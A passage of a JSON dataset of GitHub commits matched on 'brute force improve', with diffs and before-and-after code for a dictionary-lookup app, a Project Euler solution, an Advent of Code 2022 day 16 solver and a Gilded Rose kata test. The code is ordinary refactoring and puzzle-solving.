result\n\n    # We are using a local dictionary here.\n    data = lookupin(\n        word.lower(),\n        language,\n        lemmatize=False,\n        dictionary=dictionary)\n    data['definition'] = json.loads(data['definition'])\n    for d in custom_dicts:\n        if d['name'] == dictionary and d['lang'] == language and d['type'] == 'audiolib':\n            rootpath = d['path']\n            break\n    result = {}\n    for item in data['definition']:\n        qualified_name = dictionary + \":\" + os.path.splitext(item)[0]\n        result[qualified_name] = os.path.join(rootpath, item)\n    return result\n\n\ndef lookupin(\n        word: str,\n        language: str,\n        lemmatize: bool=True,\n        greedy_lemmatize: bool=False,\n        dictionary: str=\"Wiktionary (English)\",\n        gtrans_lang: str=\"en\",\n        gtrans_api: str=\"https:\/\/lingva.ml\") -> Optional[LookUpResults]:\n    # Remove any punctuation other than a hyphen\n    # @language is code\n    if not word:\n        return word\n    IS_UPPER = word[0].isupper()\n    if lemmatize:\n        word = lem_word(word, language, greedy_lemmatize)\n    # The lemmatizer would always turn words lowercase, which can cause\n    # lookups to fail if not recovered.\n    candidates = [word, word.capitalize()] if IS_UPPER else [word]\n    for word in candidates:\n        try:\n            if dictionary == \"Wiktionary (English)\":\n                item = wiktionary(word, language)\n                item['definition'] = fmt_result(item['definition'])\n                return item\n            elif dictionary == \"Google Translate\":\n                return googletranslate(word, language, gtrans_lang, gtrans_api)\n            else:\n                return {\n                    \"word\": word,\n                    \"definition\": dictdb.define(\n                        word,\n                        language,\n                        dictionary)}\n        except BaseException:\n            pass\n    raise Exception(\"Word not found\")\n\n\ndef getFreq(word, language, lemfreq, dictionary) -> Tuple[int, int]:\n    if lemfreq:\n        word = lem_word(word, language)\n    freq = dictdb.define(word.lower(), language, dictionary)\n    max_freq = dictdb.countEntriesDict(dictionary)\n    return int(freq), int(max_freq)\n\n\ndef getDictsForLang(lang: str, dicts: list):\n    \"Get the list of dictionaries for a given language\"\n    # These are for all the languages\n    results = [\"Wiktionary (English)\", \"Google Translate\"]\n    results.extend([item['name'] for item in dicts if item['lang'] ==\n                   lang and item['type'] != \"freq\" and item['type'] != 'audiolib'])\n    return results\n\n\ndef getAudioDictsForLang(lang: str, dicts: list):\n    \"Get the list of audio dictionaries for a given language\"\n    results = [\"<disabled>\"]\n    results.extend(pronunciation_sources)\n    audiolibs = [item['name'] for item in dicts if item['lang']\n                 == lang and item['type'] == \"audiolib\"]\n    results.extend(audiolibs)\n    if len(audiolibs) > 1:\n        results.append(\"<all>\")\n    return results\n\n\ndef getFreqlistsForLang(lang: str, dicts: list):\n    return [item['name']\n            for item in dicts if item['lang'] == lang and item['type'] == \"freq\"]\n\n\nforvopath = os.path.join(QStandardPaths.writableLocation(QStandardPaths.DataLocation), \"forvo\")\n\n\ndef play_audio(name: str, data: Dict[str, str], lang: str) -> str:\n    def crossplatform_playsound(relative_audio_path: str):\n        Thread(target=lambda: playsound(relative_audio_path)).start()\n\n    audiopath: str = data.get(name, \"\")\n    if not audiopath:\n        return \"\"\n\n    if not audiopath.startswith(\"https:\/\/\"):\n        crossplatform_playsound(audiopath)\n        return audiopath\n\n    fpath = os.path.join(forvopath, lang, name) + audiopath[-4:]\n    if not os.path.exists(fpath):\n        res = requests.get(audiopath, headers=HEADERS)\n\n        if res.status_code != 200:\n            # \/TODO: Maybe display error to the user?\n            return \"\"\n        \n        os.makedirs(os.path.dirname(fpath), exist_ok=True)\n        with open(fpath, 'bw') as file:\n            file.write(res.content)\n    \n    crossplatform_playsound(fpath)\n    return fpath\n\n\ndef process_definition(entry: str, mode: DefinitionDisplayModes, skip: int, newlines: int) -> str:\n    result = entry\n    result = convert_display_mode(result, mode)\n    result = skip_lines(result, skip)\n    result = collapse_newlines(result, newlines)\n    return result\n\n\ndef convert_display_mode(entry: str, mode: DefinitionDisplayModes) -> str:\n    if mode in ['Raw', 'HTML']:\n        return entry\n    elif mode == 'Markdown':\n        return markdownify(entry)  # type: ignore\n    elif mode == \"Markdown-HTML\":\n        return markdown_nop(markdownify(entry))\n    elif mode == 'Plaintext':\n        entry = entry.replace(\"<br>\", \"\\n\")\\\n                     .replace(\"<br\/>\", \"\\n\")\\\n                     .replace(\"<BR>\", \"\\n\")\n        entry = re.sub(r\"<.*?>\", \"\", entry)\n        return entry\n    else:\n        raise NotImplementedError(\"Mode not supported\")\n\n\ndef is_html(s: str) -> bool:\n    return bool(BeautifulSoup(s, \"html.parser\").find())\n\n\ndef skip_lines(entry: str, number: int) -> str:\n    if is_html(entry):\n        print(\"this is html\")\n        # Try to replace all the weird <br> tags with the standard one\n        entry = entry.replace(\"<BR>\", \"<br>\")\\\n                     .replace(\"<br\/>\", \"<br>\")\\\n                     .replace(\"<br \/>\", \"<br>\")\n        return \"<br>\".join(entry.split(\"<br>\")[number:])\n    else:\n        return \"\\n\".join(entry.splitlines()[number:])\n\n\ndef collapse_newlines(entry: str, number: int) -> str:\n    if number == 0:  # no-op\n        return entry\n    if is_html(entry):\n        # Try to replace all the weird <br> tags with the standard one\n        entry = entry.replace(\"<BR>\", \"<br>\")\\\n                     .replace(\"<br\/>\", \"<br>\")\\\n                     .replace(\"<br \/>\", \"<br>\")\n        return re.sub(r'(\\<br\\>)+', r'<br>' * number, entry)\n    else:\n        return re.sub(r'(\\n)+', r'\\n' * number, entry)\n\n\ndef markdown_nop(s: str) -> str:\n    print(removeprefix(\n        markdown(s.replace(\"\\n\", \"\\n\\n\").replace(\".\", \"\\.\")).\\\n                   replace(\"<p>\", \"<br>\").\\\n                   replace(\"<\/p>\", \"\"),\n        \"<br>\"))\n    return removeprefix(\n        markdown(s.replace(\"\\n\", \"\\n\\n\").replace(\".\", \"\\.\")).\\\n                   replace(\"<p>\", \"<br>\").\\\n                   replace(\"<\/p>\", \"\"),\n        \"<br>\"\n    )\n"}},"msg":"Improve multi word lookup handling\n\nNow it should brute force all combinations when looking up a phrase.\nShould reduce failures"}},"https:\/\/github.com\/Anve94\/project-euler":{"e567baaa7954f6f6b3803ed5941222c5562067b0":{"url":"https:\/\/api.github.com\/repos\/Anve94\/project-euler\/commits\/e567baaa7954f6f6b3803ed5941222c5562067b0","html_url":"https:\/\/github.com\/Anve94\/project-euler\/commit\/e567baaa7954f6f6b3803ed5941222c5562067b0","message":"Improves brute-force solution performance and adds additional solution","sha":"e567baaa7954f6f6b3803ed5941222c5562067b0","keyword":"brute force improve","diff":"diff --git a\/solutions\/1\/main.py b\/solutions\/1\/main.py\nindex 8e7faf5..0ce3cac 100644\n--- a\/solutions\/1\/main.py\n+++ b\/solutions\/1\/main.py\n@@ -1,23 +1,37 @@\n \"\"\"\n-Problem: If we list all the natural numbers below 10 that are\n+Problem 1: If we list all the natural numbers below 10 that are\n multiples of 3 or 5, we get 3, 5, 6 and 9. The sum of these multiples\n is 23. Find the sum of all the multiples of 3 or 5 below 1000.\n \"\"\"\n \n-def find_multiples(n: list) -> list:\n-    multiples = []\n+def solution1(n: list) -> int:\n+    \"\"\"Verbose solution by doing the checks directly.\"\"\"\n+    total = 0\n     for value in n:\n         if value % 3 == 0:\n-            multiples.append(value)\n+            total += value\n         elif value % 5 == 0:\n-            multiples.append(value)\n+            total += value\n             \n-    return multiples\n+    return total\n+\n+def solution2(n: list) -> int:\n+    \"\"\"Same as first solution but with list comprehension\"\"\"\n+    return sum([i for i in n if i % 3 == 0 or i % 5 == 0])\n+\n+def solution3() -> int:\n+    \"\"\"Different solution by summing all values divisble by 3 and\n+    5 and substracting the shared 15\n+    \"\"\"\n+    threes =  [i for i in range(3, 1000, 3)]\n+    fives = [i for i in range(5, 1000, 5)]\n+    fifteens = [i for i in range(15, 1000, 15)]\n     \n+    return sum(threes) + sum(fives) - sum(fifteens)\n+\n if __name__ == '__main__':\n     n = [i for i in range(1, 1000)]\n-    # Verbose solution with iteration\n-    print(sum(find_multiples(n)))\n \n-    # Less verbose solution with list comprehension\n-    print(sum([i for i in n if i % 3 == 0 or i % 5 == 0]))\n\\ No newline at end of file\n+    print(solution1(n))\n+    print(solution2(n))\n+    print(solution3())\n\\ No newline at end of file\n","files":{"\/solutions\/1\/main.py":{"changes":[{"diff":"\n \"\"\"\n-Problem: If we list all the natural numbers below 10 that are\n+Problem 1: If we list all the natural numbers below 10 that are\n multiples of 3 or 5, we get 3, 5, 6 and 9. The sum of these multiples\n is 23. Find the sum of all the multiples of 3 or 5 below 1000.\n \"\"\"\n \n-def find_multiples(n: list) -> list:\n-    multiples = []\n+def solution1(n: list) -> int:\n+    \"\"\"Verbose solution by doing the checks directly.\"\"\"\n+    total = 0\n     for value in n:\n         if value % 3 == 0:\n-            multiples.append(value)\n+            total += value\n         elif value % 5 == 0:\n-            multiples.append(value)\n+            total += value\n             \n-    return multiples\n+    return total\n+\n+def solution2(n: list) -> int:\n+    \"\"\"Same as first solution but with list comprehension\"\"\"\n+    return sum([i for i in n if i % 3 == 0 or i % 5 == 0])\n+\n+def solution3() -> int:\n+    \"\"\"Different solution by summing all values divisble by 3 and\n+    5 and substracting the shared 15\n+    \"\"\"\n+    threes =  [i for i in range(3, 1000, 3)]\n+    fives = [i for i in range(5, 1000, 5)]\n+    fifteens = [i for i in range(15, 1000, 15)]\n     \n+    return sum(threes) + sum(fives) - sum(fifteens)\n+\n if __name__ == '__main__':\n     n = [i for i in range(1, 1000)]\n-    # Verbose solution with iteration\n-    print(sum(find_multiples(n)))\n \n-    # Less verbose solution with list comprehension\n-    print(sum([i for i in n if i % 3 == 0 or i % 5 == 0]))\n\\ No newline at end of file\n+    print(solution1(n))\n+    print(solution2(n))\n+    print(solution3())\n\\ No newline at end of file\n","add":24,"remove":10,"filename":"\/solutions\/1\/main.py","badparts":["Problem: If we list all the natural numbers below 10 that are","def find_multiples(n: list) -> list:","    multiples = []","            multiples.append(value)","            multiples.append(value)","    return multiples","    print(sum(find_multiples(n)))","    print(sum([i for i in n if i % 3 == 0 or i % 5 == 0]))"],"goodparts":["Problem 1: If we list all the natural numbers below 10 that are","def solution1(n: list) -> int:","    \"\"\"Verbose solution by doing the checks directly.\"\"\"","    total = 0","            total += value","            total += value","    return total","def solution2(n: list) -> int:","    \"\"\"Same as first solution but with list comprehension\"\"\"","    return sum([i for i in n if i % 3 == 0 or i % 5 == 0])","def solution3() -> int:","    \"\"\"Different solution by summing all values divisble by 3 and","    5 and substracting the shared 15","    \"\"\"","    threes =  [i for i in range(3, 1000, 3)]","    fives = [i for i in range(5, 1000, 5)]","    fifteens = [i for i in range(15, 1000, 15)]","    return sum(threes) + sum(fives) - sum(fifteens)","    print(solution1(n))","    print(solution2(n))","    print(solution3())"]}],"source":"\n\"\"\" Problem: If we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6 and 9. The sum of these multiples is 23. Find the sum of all the multiples of 3 or 5 below 1000. \"\"\" def find_multiples(n: list) -> list: multiples=[] for value in n: if value % 3==0: multiples.append(value) elif value % 5==0: multiples.append(value) return multiples if __name__=='__main__': n=[i for i in range(1, 1000)] print(sum(find_multiples(n))) print(sum([i for i in n if i % 3==0 or i % 5==0])) ","sourceWithComments":"\"\"\"\nProblem: If we list all the natural numbers below 10 that are\nmultiples of 3 or 5, we get 3, 5, 6 and 9. The sum of these multiples\nis 23. Find the sum of all the multiples of 3 or 5 below 1000.\n\"\"\"\n\ndef find_multiples(n: list) -> list:\n    multiples = []\n    for value in n:\n        if value % 3 == 0:\n            multiples.append(value)\n        elif value % 5 == 0:\n            multiples.append(value)\n            \n    return multiples\n    \nif __name__ == '__main__':\n    n = [i for i in range(1, 1000)]\n    # Verbose solution with iteration\n    print(sum(find_multiples(n)))\n\n    # Less verbose solution with list comprehension\n    print(sum([i for i in n if i % 3 == 0 or i % 5 == 0]))"}},"msg":"Improves brute-force solution performance and adds additional solution"}},"https:\/\/github.com\/jwalrus\/adventofcode":{"1a2759aa85ef541084854d653fd788aafba7745f":{"url":"https:\/\/api.github.com\/repos\/jwalrus\/adventofcode\/commits\/1a2759aa85ef541084854d653fd788aafba7745f","html_url":"https:\/\/github.com\/jwalrus\/adventofcode\/commit\/1a2759aa85ef541084854d653fd788aafba7745f","message":"feat: Day 16, 2022\n\npart 2 is just brute force ... too lazy to improve it","sha":"1a2759aa85ef541084854d653fd788aafba7745f","keyword":"brute force improve","diff":"diff --git a\/2022\/day16\/day16.py b\/2022\/day16\/day16.py\nindex 4edb94d..da5c86e 100644\n--- a\/2022\/day16\/day16.py\n+++ b\/2022\/day16\/day16.py\n@@ -1,3 +1,4 @@\n+import itertools\n import re\n \n import sys\n@@ -42,27 +43,83 @@ def dfs(start, targets, distances, rates, t, seen):\n     seen = seen | {start}\n     targets = targets - seen\n     best_flow = 0\n+    best_order = []\n \n     for target in targets:\n         new_t = t - distances[(start, target)] - 1  # plus 1 is opening the valve\n         if new_t > 0:\n-            flow = new_t * rates[target] + dfs(target, targets, distances, rates, new_t, seen)\n+            flow, order = dfs(target, targets, distances, rates, new_t, seen)\n+            flow = new_t * rates[target] + flow\n+            order = [target] + order\n             if flow > best_flow:\n                 best_flow = flow\n+                best_order = order\n \n-    return best_flow\n+    return best_flow, best_order\n \n \n-def part1(graph, rates):\n+def part1(graph, rates, t):\n     distances = {(k, n): d for k in graph for n, d in bfs(k, graph).items()}\n     targets = {valve for valve, rate in rates.items() if rate > 0}\n-    return dfs(\"AA\", targets, distances, rates, 30, seen=set())\n+    return dfs(\"AA\", targets, distances, rates, t, seen=set())\n+\n+\n+def part2(graph, rates, t):\n+    distances = {(k, n): d for k in graph for n, d in bfs(k, graph).items()}\n+    targets = {valve for valve, rate in rates.items() if rate > 0}\n+    targets = set(itertools.permutations(targets, 2))\n+\n+    def dfs2(me, el, targetz, t_me, t_el, seen):\n+        best_flow_me = 0\n+        best_flow_el = 0\n+        best_me = []\n+        best_el = []\n+\n+        seen = seen | {me, el}\n+        targetz = {(x, y) for x, y in targetz if x not in seen and y not in seen}\n+\n+        for target_me, target_el in targetz:\n+            new_t_me = t_me - distances[(me, target_me)] - 1\n+            new_t_el = t_el - distances[(el, target_el)] - 1\n+\n+            flow_me, flow_el, order_me, order_el = 0, 0, [], []\n+            match new_t_me > 0, new_t_el > 0:\n+                case True, True:\n+                    flow_me, flow_el, order_me, order_el = dfs2(target_me, target_el, targetz, new_t_me, new_t_el, seen)\n+                    flow_me += new_t_me * rates[target_me]\n+                    flow_el += new_t_el * rates[target_el]\n+                    order_me = [target_me] + order_me\n+                    order_el = [target_el] + order_el\n+                case True, False:\n+                    flow_me, order_me = dfs(target_me, {a for a, _ in targetz}, distances, rates, new_t_me, seen)\n+                    flow_me += new_t_me * rates[target_me]\n+                    flow_el, order_el = 0, []\n+                    order_me = [target_me] + order_me\n+                case False, True:\n+                    flow_el, order_el = dfs(target_el, {b for _, b in targetz}, distances, rates, new_t_el, seen)\n+                    flow_el += new_t_el * rates[target_el]\n+                    flow_me, order_me = 0, []\n+                    order_el = [target_el] + order_el\n+                case _:\n+                    pass\n+\n+            if flow_me + flow_el > best_flow_el + best_flow_me:\n+                best_flow_me = flow_me\n+                best_flow_el = flow_el\n+                best_me = order_me\n+                best_el = order_el\n+\n+        return best_flow_me, best_flow_el, best_me, best_el\n+\n+    me_f, el_f, me_o, el_o = dfs2(\"AA\", \"AA\", targets, 26, 26, set())\n+    return me_f + el_f, me_o, el_o\n \n \n def main():\n     with open(sys.argv[1], \"r\") as f:\n         graph, rates = parse(f.read().split(\"\\n\"))\n-        print(\"part1:\", part1(graph, rates))  # 1796\n+        print(\"part1:\", part1(graph, rates, t=30))  # 1796\n+        print(\"part2:\", part2(graph, rates, t=26))  # 1999\n \n \n if __name__ == \"__main__\":\n","files":{"\/2022\/day16\/day16.py":{"changes":[{"diff":"\n     seen = seen | {start}\n     targets = targets - seen\n     best_flow = 0\n+    best_order = []\n \n     for target in targets:\n         new_t = t - distances[(start, target)] - 1  # plus 1 is opening the valve\n         if new_t > 0:\n-            flow = new_t * rates[target] + dfs(target, targets, distances, rates, new_t, seen)\n+            flow, order = dfs(target, targets, distances, rates, new_t, seen)\n+            flow = new_t * rates[target] + flow\n+            order = [target] + order\n             if flow > best_flow:\n                 best_flow = flow\n+                best_order = order\n \n-    return best_flow\n+    return best_flow, best_order\n \n \n-def part1(graph, rates):\n+def part1(graph, rates, t):\n     distances = {(k, n): d for k in graph for n, d in bfs(k, graph).items()}\n     targets = {valve for valve, rate in rates.items() if rate > 0}\n-    return dfs(\"AA\", targets, distances, rates, 30, seen=set())\n+    return dfs(\"AA\", targets, distances, rates, t, seen=set())\n+\n+\n+def part2(graph, rates, t):\n+    distances = {(k, n): d for k in graph for n, d in bfs(k, graph).items()}\n+    targets = {valve for valve, rate in rates.items() if rate > 0}\n+    targets = set(itertools.permutations(targets, 2))\n+\n+    def dfs2(me, el, targetz, t_me, t_el, seen):\n+        best_flow_me = 0\n+        best_flow_el = 0\n+        best_me = []\n+        best_el = []\n+\n+        seen = seen | {me, el}\n+        targetz = {(x, y) for x, y in targetz if x not in seen and y not in seen}\n+\n+        for target_me, target_el in targetz:\n+            new_t_me = t_me - distances[(me, target_me)] - 1\n+            new_t_el = t_el - distances[(el, target_el)] - 1\n+\n+            flow_me, flow_el, order_me, order_el = 0, 0, [], []\n+            match new_t_me > 0, new_t_el > 0:\n+                case True, True:\n+                    flow_me, flow_el, order_me, order_el = dfs2(target_me, target_el, targetz, new_t_me, new_t_el, seen)\n+                    flow_me += new_t_me * rates[target_me]\n+                    flow_el += new_t_el * rates[target_el]\n+                    order_me = [target_me] + order_me\n+                    order_el = [target_el] + order_el\n+                case True, False:\n+                    flow_me, order_me = dfs(target_me, {a for a, _ in targetz}, distances, rates, new_t_me, seen)\n+                    flow_me += new_t_me * rates[target_me]\n+                    flow_el, order_el = 0, []\n+                    order_me = [target_me] + order_me\n+                case False, True:\n+                    flow_el, order_el = dfs(target_el, {b for _, b in targetz}, distances, rates, new_t_el, seen)\n+                    flow_el += new_t_el * rates[target_el]\n+                    flow_me, order_me = 0, []\n+                    order_el = [target_el] + order_el\n+                case _:\n+                    pass\n+\n+            if flow_me + flow_el > best_flow_el + best_flow_me:\n+                best_flow_me = flow_me\n+                best_flow_el = flow_el\n+                best_me = order_me\n+                best_el = order_el\n+\n+        return best_flow_me, best_flow_el, best_me, best_el\n+\n+    me_f, el_f, me_o, el_o = dfs2(\"AA\", \"AA\", targets, 26, 26, set())\n+    return me_f + el_f, me_o, el_o\n \n \n def main():\n     with open(sys.argv[1], \"r\") as f:\n         graph, rates = parse(f.read().split(\"\\n\"))\n-        print(\"part1:\", part1(graph, rates))  # 1796\n+        print(\"part1:\", part1(graph, rates, t=30))  # 1796\n+        print(\"part2:\", part2(graph, rates, t=26))  # 1999\n \n \n if __name__ == \"__main__\":\n","add":61,"remove":5,"filename":"\/2022\/day16\/day16.py","badparts":["            flow = new_t * rates[target] + dfs(target, targets, distances, rates, new_t, seen)","    return best_flow","def part1(graph, rates):","    return dfs(\"AA\", targets, distances, rates, 30, seen=set())","        print(\"part1:\", part1(graph, rates))  # 1796"],"goodparts":["    best_order = []","            flow, order = dfs(target, targets, distances, rates, new_t, seen)","            flow = new_t * rates[target] + flow","            order = [target] + order","                best_order = order","    return best_flow, best_order","def part1(graph, rates, t):","    return dfs(\"AA\", targets, distances, rates, t, seen=set())","def part2(graph, rates, t):","    distances = {(k, n): d for k in graph for n, d in bfs(k, graph).items()}","    targets = {valve for valve, rate in rates.items() if rate > 0}","    targets = set(itertools.permutations(targets, 2))","    def dfs2(me, el, targetz, t_me, t_el, seen):","        best_flow_me = 0","        best_flow_el = 0","        best_me = []","        best_el = []","        seen = seen | {me, el}","        targetz = {(x, y) for x, y in targetz if x not in seen and y not in seen}","        for target_me, target_el in targetz:","            new_t_me = t_me - distances[(me, target_me)] - 1","            new_t_el = t_el - distances[(el, target_el)] - 1","            flow_me, flow_el, order_me, order_el = 0, 0, [], []","            match new_t_me > 0, new_t_el > 0:","                case True, True:","                    flow_me, flow_el, order_me, order_el = dfs2(target_me, target_el, targetz, new_t_me, new_t_el, seen)","                    flow_me += new_t_me * rates[target_me]","                    flow_el += new_t_el * rates[target_el]","                    order_me = [target_me] + order_me","                    order_el = [target_el] + order_el","                case True, False:","                    flow_me, order_me = dfs(target_me, {a for a, _ in targetz}, distances, rates, new_t_me, seen)","                    flow_me += new_t_me * rates[target_me]","                    flow_el, order_el = 0, []","                    order_me = [target_me] + order_me","                case False, True:","                    flow_el, order_el = dfs(target_el, {b for _, b in targetz}, distances, rates, new_t_el, seen)","                    flow_el += new_t_el * rates[target_el]","                    flow_me, order_me = 0, []","                    order_el = [target_el] + order_el","                case _:","                    pass","            if flow_me + flow_el > best_flow_el + best_flow_me:","                best_flow_me = flow_me","                best_flow_el = flow_el","                best_me = order_me","                best_el = order_el","        return best_flow_me, best_flow_el, best_me, best_el","    me_f, el_f, me_o, el_o = dfs2(\"AA\", \"AA\", targets, 26, 26, set())","    return me_f + el_f, me_o, el_o","        print(\"part1:\", part1(graph, rates, t=30))  # 1796","        print(\"part2:\", part2(graph, rates, t=26))  # 1999"]}],"source":"\nimport re import sys from collections import defaultdict, deque def parse(lines): regex=re.compile(r\"^Valve(?P<id>[A-Z]+) has flow rate=(?P<rate>\\d+);.+to(valve|valves)(?P<valves>.+)$\") matches=[re.match(regex, line) for line in lines] scan_output=[ (match[\"id\"], int(match[\"rate\"]), list(match[\"valves\"].split(\", \"))) for match in matches ] graph=defaultdict(list) for scan in scan_output: for _next in scan[2]: graph[scan[0]].append(_next) rates={scan[0]: scan[1] for scan in scan_output} return graph, rates def bfs(start, graph): queue=deque([(start, 0)]) visited={start} distances=dict() while queue: cur, depth=queue.popleft() for n in graph[cur]: if n not in visited: queue.append((n, depth +1)) visited.add(n) distances[n]=depth +1 return distances def dfs(start, targets, distances, rates, t, seen): seen=seen |{start} targets=targets -seen best_flow=0 for target in targets: new_t=t -distances[(start, target)] -1 if new_t > 0: flow=new_t * rates[target] +dfs(target, targets, distances, rates, new_t, seen) if flow > best_flow: best_flow=flow return best_flow def part1(graph, rates): distances={(k, n): d for k in graph for n, d in bfs(k, graph).items()} targets={valve for valve, rate in rates.items() if rate > 0} return dfs(\"AA\", targets, distances, rates, 30, seen=set()) def main(): with open(sys.argv[1], \"r\") as f: graph, rates=parse(f.read().split(\"\\n\")) print(\"part1:\", part1(graph, rates)) if __name__==\"__main__\": main() ","sourceWithComments":"import re\n\nimport sys\nfrom collections import defaultdict, deque\n\n\ndef parse(lines):\n    regex = re.compile(r\"^Valve (?P<id>[A-Z]+) has flow rate=(?P<rate>\\d+); .+ to (valve|valves) (?P<valves>.+)$\")\n    matches = [re.match(regex, line) for line in lines]\n    scan_output = [\n        (match[\"id\"], int(match[\"rate\"]), list(match[\"valves\"].split(\", \")))\n        for match in matches\n    ]\n\n    graph = defaultdict(list)\n    for scan in scan_output:\n        for _next in scan[2]:\n            graph[scan[0]].append(_next)\n\n    rates = {scan[0]: scan[1] for scan in scan_output}\n\n    return graph, rates\n\n\ndef bfs(start, graph):\n    queue = deque([(start, 0)])\n    visited = {start}\n    distances = dict()\n\n    while queue:\n        cur, depth = queue.popleft()\n        for n in graph[cur]:\n            if n not in visited:\n                queue.append((n, depth + 1))\n                visited.add(n)\n                distances[n] = depth + 1\n\n    return distances\n\n\ndef dfs(start, targets, distances, rates, t, seen):\n    seen = seen | {start}\n    targets = targets - seen\n    best_flow = 0\n\n    for target in targets:\n        new_t = t - distances[(start, target)] - 1  # plus 1 is opening the valve\n        if new_t > 0:\n            flow = new_t * rates[target] + dfs(target, targets, distances, rates, new_t, seen)\n            if flow > best_flow:\n                best_flow = flow\n\n    return best_flow\n\n\ndef part1(graph, rates):\n    distances = {(k, n): d for k in graph for n, d in bfs(k, graph).items()}\n    targets = {valve for valve, rate in rates.items() if rate > 0}\n    return dfs(\"AA\", targets, distances, rates, 30, seen=set())\n\n\ndef main():\n    with open(sys.argv[1], \"r\") as f:\n        graph, rates = parse(f.read().split(\"\\n\"))\n        print(\"part1:\", part1(graph, rates))  # 1796\n\n\nif __name__ == \"__main__\":\n    main()\n"}},"msg":"feat: Day 16, 2022\n\npart 2 is just brute force ... too lazy to improve it"}},"https:\/\/github.com\/JosepBernad\/GildedRose":{"029f5823ae168c5f8358c86daf9019bdecace9fa":{"url":"https:\/\/api.github.com\/repos\/JosepBernad\/GildedRose\/commits\/029f5823ae168c5f8358c86daf9019bdecace9fa","html_url":"https:\/\/github.com\/JosepBernad\/GildedRose\/commit\/029f5823ae168c5f8358c86daf9019bdecace9fa","message":"Fix and improve Brute Force Test.\nFix item increase and decrease methods.","sha":"029f5823ae168c5f8358c86daf9019bdecace9fa","keyword":"brute force improve","diff":"diff --git a\/Item.py b\/Item.py\nindex 2c0393c..bc486b6 100644\n--- a\/Item.py\n+++ b\/Item.py\n@@ -1,17 +1,23 @@\n class Item:\n+    MAX_QUALITY = 50\n+    MIN_QUALITY = 0\n+\n     def __init__(self, name, sell_in, quality):\n         self.name = name\n         self.sell_in = sell_in\n         self.quality = quality\n \n     def increaseQuality(self):\n-        self.increaseQualityBy(1)\n+        if self.quality < self.MAX_QUALITY:\n+            self.quality += 1\n \n     def decreaseQuality(self):\n-        self.quality = max(0, self.quality - 1)\n+        if self.quality > self.MIN_QUALITY:\n+            self.quality -= 1\n \n     def increaseQualityBy(self, n):\n-        self.quality = min(50, self.quality + n)\n+        for i in range(0, n):\n+            self.increaseQuality()\n \n     def decreaseSellIn(self):\n         self.sell_in = self.sell_in - 1\ndiff --git a\/test_gilded_rose.py b\/test_gilded_rose.py\nindex 148f13d..c74a769 100644\n--- a\/test_gilded_rose.py\n+++ b\/test_gilded_rose.py\n@@ -1,13 +1,13 @@\n import unittest\n+import logging\n \n from GildedRoseJosep import GildedRoseJosep\n from gilded_rose import GildedRose\n from Item import Item\n \n-\n class GildedRoseTest(unittest.TestCase):\n \n-    names = [\n+    NAMES = [\n         \"Aged Brie\",\n         \"Backstage passes to a TAFKAL80ETC concert\",\n         \"Sulfuras, Hand of Ragnaros\",\n@@ -15,28 +15,32 @@ class GildedRoseTest(unittest.TestCase):\n     ]\n \n     def testBruteForce(self):\n-        iterations = 5\n+        days = 2\n \n         itemsOriginal = []\n+        itemsProcessed = []\n+        itemsProcessedOriginal = []\n \n         for i in range(-100, 100):\n             for j in range(-100, 100):\n-                for name in self.names:\n+                for name in self.NAMES:\n                     itemsOriginal.append(Item(name=name, sell_in=i, quality=j))\n+                    itemsProcessed.append(Item(name=name, sell_in=i, quality=j))\n+                    itemsProcessedOriginal.append(Item(name=name, sell_in=i, quality=j))\n \n-        itemsProcessed = itemsOriginal.copy()\n-\n-        for i in range(1, iterations):\n+        for i in range(1, days):\n             GildedRose(itemsOriginal).update_quality()\n             GildedRoseJosep(itemsProcessed).updateQuality()\n \n             for j in range(len(itemsOriginal) - 1):\n-                if itemsOriginal[i].quality != itemsProcessed[i].quality or \\\n-                        itemsOriginal[i].sell_in != itemsProcessed[i].sell_in:\n-                    print(itemsOriginal[i])\n-                    print(itemsProcessed[i])\n-                    self.assertEqual(itemsOriginal[i].quality, itemsProcessed[i].quality)\n-                    self.assertEqual(itemsOriginal[i].sell_in, itemsProcessed[i].sell_in)\n+                if itemsOriginal[j].quality != itemsProcessed[j].quality or \\\n+                        itemsOriginal[j].sell_in != itemsProcessed[j].sell_in:\n+                    print(\"------ \" + i.__str__() + \" ------\")\n+                    print(\"Item original:\" + itemsOriginal[j].__repr__())\n+                    print(\"Item processed original:\" + itemsProcessedOriginal[j].__repr__())\n+                    print(\"Item processed:\" + itemsProcessed[j].__repr__())\n+                    self.assertEqual(itemsOriginal[j].quality, itemsProcessed[j].quality)\n+                    self.assertEqual(itemsOriginal[j].sell_in, itemsProcessed[j].sell_in)\n \n \n if __name__ == '__main__':\n","files":{"\/Item.py":{"changes":[{"diff":"\n class Item:\n+    MAX_QUALITY = 50\n+    MIN_QUALITY = 0\n+\n     def __init__(self, name, sell_in, quality):\n         self.name = name\n         self.sell_in = sell_in\n         self.quality = quality\n \n     def increaseQuality(self):\n-        self.increaseQualityBy(1)\n+        if self.quality < self.MAX_QUALITY:\n+            self.quality += 1\n \n     def decreaseQuality(self):\n-        self.quality = max(0, self.quality - 1)\n+        if self.quality > self.MIN_QUALITY:\n+            self.quality -= 1\n \n     def increaseQualityBy(self, n):\n-        self.quality = min(50, self.quality + n)\n+        for i in range(0, n):\n+            self.increaseQuality()\n \n     def decreaseSellIn(self):\n         self.sell_in = self.sell_in - 1","add":9,"remove":3,"filename":"\/Item.py","badparts":["        self.increaseQualityBy(1)","        self.quality = max(0, self.quality - 1)","        self.quality = min(50, self.quality + n)"],"goodparts":["    MAX_QUALITY = 50","    MIN_QUALITY = 0","        if self.quality < self.MAX_QUALITY:","            self.quality += 1","        if self.quality > self.MIN_QUALITY:","            self.quality -= 1","        for i in range(0, n):","            self.increaseQuality()"]}],"source":"\nclass Item: def __init__(self, name, sell_in, quality): self.name=name self.sell_in=sell_in self.quality=quality def increaseQuality(self): self.increaseQualityBy(1) def decreaseQuality(self): self.quality=max(0, self.quality -1) def increaseQualityBy(self, n): self.quality=min(50, self.quality +n) def decreaseSellIn(self): self.sell_in=self.sell_in -1 def __repr__(self): return \"%s, %s, %s\" %(self.name, self.sell_in, self.quality) ","sourceWithComments":"class Item:\n    def __init__(self, name, sell_in, quality):\n        self.name = name\n        self.sell_in = sell_in\n        self.quality = quality\n\n    def increaseQuality(self):\n        self.increaseQualityBy(1)\n\n    def decreaseQuality(self):\n        self.quality = max(0, self.quality - 1)\n\n    def increaseQualityBy(self, n):\n        self.quality = min(50, self.quality + n)\n\n    def decreaseSellIn(self):\n        self.sell_in = self.sell_in - 1\n\n    def __repr__(self):\n        return \"%s, %s, %s\" % (self.name, self.sell_in, 